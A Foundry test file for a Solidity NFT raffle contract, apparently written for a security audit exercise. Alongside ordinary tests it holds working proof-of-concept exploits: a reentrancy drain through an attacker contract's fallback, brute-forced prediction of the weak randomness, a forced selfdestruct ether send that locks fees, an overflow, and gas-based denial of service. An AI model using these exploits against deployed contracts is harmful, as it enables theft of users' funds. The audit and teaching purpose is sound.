// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string
            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    function testAuditFeeOverflow() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        //entraceFee = 25e18 to reach 18.44 for its 20%
        //or enter n players with 1e18 until 18.44 in fees are over passed
        uint256 expectedFee = (4 * entranceFee * 20) / 100;
        puppyRaffle.selectWinner();
        uint256 totalFees = puppyRaffle.totalFees();
        assertNotEq(expectedFee, totalFees);
    }

    function testAuditDOSByEnteringRaffle() public {
        //enter some player to ignore, array allocation
        address[] memory aPlayer = new address[](1);
        aPlayer[0] = address(100);
        puppyRaffle.enterRaffle{value: aPlayer.length * entranceFee}(aPlayer);

        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;

        uint256 firstJoinGasInit = gasleft();
        puppyRaffle.enterRaffle{value: players.length * entranceFee}(players);
        uint256 firstJoinCost = (firstJoinGasInit - gasleft());

        players[0] = playerThree;
        players[1] = playerFour;

        uint256 secondJoinGasInit = gasleft();
        puppyRaffle.enterRaffle{value: players.length * entranceFee}(players);
        uint256 secondJoinCost = (secondJoinGasInit - gasleft());

        assertGt(secondJoinCost, firstJoinCost);
    }

    function testAuditRefundReentrancy() public playersEntered {
        AtackerContract atacker = new AtackerContract(puppyRaffle);
        address[] memory players = new address[](1);
        players[0] = address(atacker);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        uint256 index = puppyRaffle.getActivePlayerIndex(address(atacker));

        uint256 initBalance = address(puppyRaffle).balance;
        vm.prank(address(atacker));
        puppyRaffle.refund(index);

        uint256 endingBalance = address(puppyRaffle).balance;
        assertGt(initBalance, entranceFee);
        assertEq(endingBalance, 0);
    }
    function testAuditWeakRNG() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 myIndex = puppyRaffle.getActivePlayerIndex(playerTwo);
        uint256 potentialRNG;
        while (myIndex != potentialRNG) {
            potentialRNG =
                uint256(
                    keccak256(
                        abi.encodePacked(
                            playerTwo,
                            block.timestamp,
                            block.difficulty
                        )
                    )
                ) %
                4;
            vm.warp(block.timestamp + 1);
            vm.roll(block.number + 1);
        }

        vm.prank(playerTwo);
        puppyRaffle.selectWinner();
        address winner = puppyRaffle.previousWinner();
        assertEq(winner, playerTwo);
    }
    function testAuditRevertAttack() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.prank(playerTwo);
        puppyRaffle.selectWinner();
        address winner = puppyRaffle.previousWinner();
        if (winner != playerTwo) {
            vm.expectRevert();
            revert();
        }

        assertEq(winner, playerTwo);
    }

    function testAuditLockFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 totalFees = puppyRaffle.totalFees();
        assertGt(totalFees, 0);

        AtackerContract atacker = new AtackerContract(puppyRaffle);
        vm.deal(address(atacker), 1e18);
        atacker.forceSendEther();

        vm.expectRevert();
        puppyRaffle.withdrawFees();
        assertEq(totalFees + 1e18, address(puppyRaffle).balance);
    }
}

contract AtackerContract {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function forceSendEther() external {
        selfdestruct(payable(address(puppyRaffle)));
    }

    function onlyWin() external {
        puppyRaffle.selectWinner();
        require(puppyRaffle.previousWinner() == address(this), "Not Winner");
    }

    function _drainFunds() internal {
        uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(index);
        }
    }

    fallback() external payable {
        _drainFunds();
    }

    receive() external payable {
        _drainFunds();
    }
}
